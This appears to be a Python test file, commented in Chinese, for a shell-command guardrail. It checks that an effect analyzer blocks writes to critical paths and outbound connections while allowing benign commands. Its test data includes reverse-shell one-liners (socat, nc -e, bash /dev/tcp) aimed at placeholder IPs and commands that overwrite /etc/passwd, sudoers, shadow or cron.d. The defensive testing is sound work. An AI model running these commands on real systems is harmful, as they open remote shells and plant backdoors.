"""副作用集（EffectSet）分析红队测试 —— 固化「按效果判定」对「按字面拦串」的根治。

本模块证明四件事，防回归：
1. 真阳性：既有正则/AST 规则可能漏掉的「按效果应拦」命令，被 effect_analyzer 据**实际写/删
   关键路径或外联**抓到并升级（install/cp/mv/tee 落进 /etc、/boot、sudoers；socat/dev-tcp 外联）。
2. 不误杀：写 /tmp、写家目录、**读** /etc（tar/cat/cp 的源）、单文件 chmod 等良性命令，
   effect_analyzer 一律沉默（不收录写/删、egress=False），命令仍放行。
3. EffectSet 的字段语义正确（writes/deletes/egress/needs_priv）。
4. 只升级不降级 + 故障安全：叠加 effect 分析后红队 SAFE 仍 100% 放行、DANGEROUS 仍 100% 拦；
   畸形输入不崩溃、不放行。

铁律：全程只验证「是否被拦/有无效果」，绝不真实执行任何危险命令（CLAUDE.md §6）。
"""
from __future__ import annotations

import pytest

from app.guardrail.effect_analyzer import analyze_effects
from app.guardrail.engine import check_command
from app.guardrail.rules import match_rules

# 复用红队语料作回归底座（只读，不改 test_guardrail_redteam.py）
from tests.test_guardrail_redteam import DANGEROUS, SAFE


# ============ 1. 真阳性：据「写/删关键路径」效果抓到，命令被拦 ============

class TestEffectTruePositives:
    """目的路径落关键区 → effect 升级 → check_command 不放行。"""
    # 这些命令的危险性在「内容实际落进关键区」，而非某个已枚举的坏串。
    WRITE_CRITICAL = [
        "install -m 0777 payload /etc/cron.d/x",   # install 把文件装进 /etc/cron.d
        "cp evil /etc/passwd",                      # cp 覆盖关键凭据文件
        "mv x /boot/",                              # mv 写 /boot
        "tee -a /etc/sudoers",                      # tee 追加 sudoers
        "cp backdoor.so /usr/lib/",                 # cp 写 /usr/lib
        "install evil /lib/systemd/system/x.service",  # 植入 service 单元
        "mv shell /bin/ls",                         # 覆盖系统二进制
        "tee /etc/ssh/sshd_config",                 # 改写 sshd 配置
        "dd if=/dev/zero of=/etc/shadow",           # dd of= 落进关键文件（非块设备）
        "touch /etc/cron.d/backdoor",               # 在 cron.d 埋文件
    ]

    @pytest.mark.parametrize("cmd", WRITE_CRITICAL)
    def test_effect_reports_write(self, cmd):
        eff = analyze_effects(cmd)
        assert eff.writes, f"未据效果识别出写关键路径: {cmd!r}"
        assert eff.hits_critical

    @pytest.mark.parametrize("cmd", WRITE_CRITICAL)
    def test_blocked_by_full_check(self, cmd):
        assert check_command(cmd).allowed is False, f"按效果应拦却放行: {cmd!r}"


class TestEffectEgress:
    """外联/反弹 shell 据结构判定（与 EGRESS-* 呼应，但从 token 结构得出）。"""
    EGRESS = [
        "socat tcp-connect:10.0.0.1:4444 exec:/bin/sh",
        "nc -e /bin/sh 10.0.0.1 4444",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "ncat --exec /bin/bash 1.2.3.4 9001",
    ]

    @pytest.mark.parametrize("cmd", EGRESS)
    def test_effect_flags_egress(self, cmd):
        assert analyze_effects(cmd).egress is True, f"未识别外联效果: {cmd!r}"

    @pytest.mark.parametrize("cmd", EGRESS)
    def test_blocked(self, cmd):
        assert check_command(cmd).allowed is False


class TestEffectCatchesRegexBlindSpot:
    """证明 effect 补的是真盲区：纯正则(match_rules)对这些失配，但据效果被拦。

    install/cp/mv/touch 把文件落进关键区——既有高危正则只盯 rm/chmod/重定向，对「写类动词
    落关键路径」无规则，故 match_rules 命中为空，但 effect 据写目的拦下。
    """
    SAMPLES = [
        "install -m 0777 payload /etc/cron.d/x",
        "cp evil /etc/passwd",
        "mv x /boot/",
        "touch /etc/cron.d/backdoor",
    ]

    @pytest.mark.parametrize("cmd", SAMPLES)
    def test_regex_alone_misses(self, cmd):
        assert match_rules(cmd) == [], f"正则其实已覆盖，样本不构成『漏网』: {cmd!r}"

    @pytest.mark.parametrize("cmd", SAMPLES)
    def test_effect_catches(self, cmd):
        assert check_command(cmd).allowed is False, f"effect 未补上正则盲区: {cmd!r}"


# ============ 2. 良性对照：effect 必须沉默，命令仍放行（守「误杀率 0%」） ============

class TestEffectBenignSilent:
    """写非关键路径 / 读关键路径源 / 元数据变更 → effect 不收录任何写/删/外联。"""
    BENIGN = [
        "cp /etc/a /home/u/",                 # 读 /etc，写 /home（目的非关键）
        "tar -czf /tmp/x.tgz /etc",           # 写 /tmp，把 /etc 当只读源
        "cat /var/log/x",                     # 纯读
        "rm -rf /tmp/mycache",                # 删 /tmp（非关键）
        "chmod 644 /etc/hosts",               # 元数据变更，不当作写
        "chmod 600 /home/user/.ssh/id_rsa",   # 改家目录密钥权限
        "cp app.conf /home/user/app.conf",    # 家目录间拷贝
        "mv /tmp/a /tmp/b",                    # /tmp 内移动
        "tee /tmp/out.log",                   # 写 /tmp
        "install -m 0644 x /opt/app/x",       # 写 /opt（非关键）
        "dd if=/dev/zero of=/tmp/img bs=1M",  # dd 写 /tmp 镜像
        "touch /home/user/flag",              # 家目录建文件
        "nc -z 127.0.0.1 80",                 # 端口探测（无 -e）
        "socat - TCP:127.0.0.1:8080",         # 仅转发（无 EXEC/SYSTEM）
        "ln -s /etc/nginx/nginx.conf /home/user/nginx.conf",  # 软链在家目录（目的非关键）
        "truncate -s 0 /home/user/app.log",   # 截断家目录日志
    ]

    @pytest.mark.parametrize("cmd", BENIGN)
    def test_no_critical_effect(self, cmd):
        eff = analyze_effects(cmd)
        assert eff.writes == [], f"良性命令被误判出写关键路径: {cmd!r} → {eff.writes}"
        assert eff.deletes == [], f"良性命令被误判出删关键路径: {cmd!r} → {eff.deletes}"
        assert eff.egress is False, f"良性命令被误判出外联: {cmd!r}"
        assert eff.hits_critical is False

    @pytest.mark.parametrize("cmd", BENIGN)
    def test_still_allowed(self, cmd):
        assert check_command(cmd).allowed is True, f"良性命令被误杀: {cmd!r} → {check_command(cmd).reason}"


# ============ 3. EffectSet 字段语义 ============

class TestEffectSetSemantics:
    def test_write_dest_is_last_operand_for_cp(self):
        """cp SRC DEST：源是 /etc（读，不收），目的是 /home（非关键，不收）→ 写集为空。"""
        eff = analyze_effects("cp /etc/passwd /home/u/passwd.bak")
        assert eff.writes == []

    def test_cp_to_critical_collects_only_dest(self):
        """cp /home/x /etc/passwd：只收目的 /etc/passwd，不把源 /home 当写。"""
        eff = analyze_effects("cp /home/x /etc/passwd")
        assert any(p.endswith("/etc/passwd") for p in eff.writes)
        assert all("/home" not in p for p in eff.writes)

    def test_redirect_to_critical_is_write(self):
        eff = analyze_effects("echo x >> /etc/hosts")
        assert any(p.endswith("/etc/hosts") for p in eff.writes)

    def test_redirect_to_tmp_silent(self):
        assert analyze_effects("echo x >> /tmp/out").writes == []

    def test_relative_path_normalized_into_critical(self):
        """realpath 规范化：tee /etc/../etc/cron.d/x 落回 /etc/cron.d → 收录（防相对路径绕过）。"""
        eff = analyze_effects("tee /etc/../etc/cron.d/x")
        assert any(p.startswith("/etc") for p in eff.writes)

    def test_variable_path_not_resolved(self):
        """含 $VAR 的路径静态判不准 → 沉默（保守，不臆测）。"""
        assert analyze_effects("cp evil $TARGET").writes == []
        assert analyze_effects("tee $DST/x").writes == []

    def test_glob_path_not_resolved(self):
        """含通配的目的判不准 → 沉默。"""
        assert analyze_effects("cp evil /etc/*").writes == []

    def test_needs_priv_for_service_mgmt(self):
        assert analyze_effects("systemctl restart nginx").needs_priv is True
        assert analyze_effects("apt-get install nginx").needs_priv is True

    def test_needs_priv_false_for_readonly(self):
        assert analyze_effects("df -h").needs_priv is False

    def test_delete_critical_via_rm(self):
        eff = analyze_effects("rm -rf /etc")
        assert any(p.startswith("/etc") for p in eff.deletes)

    def test_truncate_zero_critical_is_delete(self):
        eff = analyze_effects("truncate -s 0 /etc/passwd")
        assert any(p.endswith("/etc/passwd") for p in eff.deletes)

    def test_effect_inside_command_substitution(self):
        """藏在 $() 里的写关键路径子命令也被归集（结构包裹挡不住效果）。"""
        eff = analyze_effects("echo $(cp evil /etc/passwd)")
        assert any(p.endswith("/etc/passwd") for p in eff.writes)


# ============ 4. 故障安全 + 不变量 ============

class TestEffectFailsSafe:
    MALFORMED = ["cp '", "tee $(", "<<<", "mv |", "install > ", "$(("]

    def test_never_raises(self):
        for cmd in self.MALFORMED + ["", "   ", "\n", "';'", ")("]:
            analyze_effects(cmd)  # 不抛异常即通过

    @pytest.mark.parametrize("cmd", MALFORMED)
    def test_malformed_returns_effectset(self, cmd):
        eff = analyze_effects(cmd)
        # 解析失败时退化为「不升级」（空写删），把裁决交回规则/AST 层
        assert eff.writes == [] and eff.deletes == []


class TestNoRegressionWithEffectLayer:
    """叠加 effect 分析后，红队全集结论不变：SAFE 全放行、DANGEROUS 全拦。"""

    @pytest.mark.parametrize("cmd", SAFE)
    def test_safe_still_allowed(self, cmd):
        assert check_command(cmd).allowed is True, f"effect 层误杀正常命令: {cmd!r}"

    @pytest.mark.parametrize("cmd", DANGEROUS)
    def test_dangerous_still_blocked(self, cmd):
        assert check_command(cmd).allowed is False, f"effect 层后危险命令漏拦: {cmd!r}"
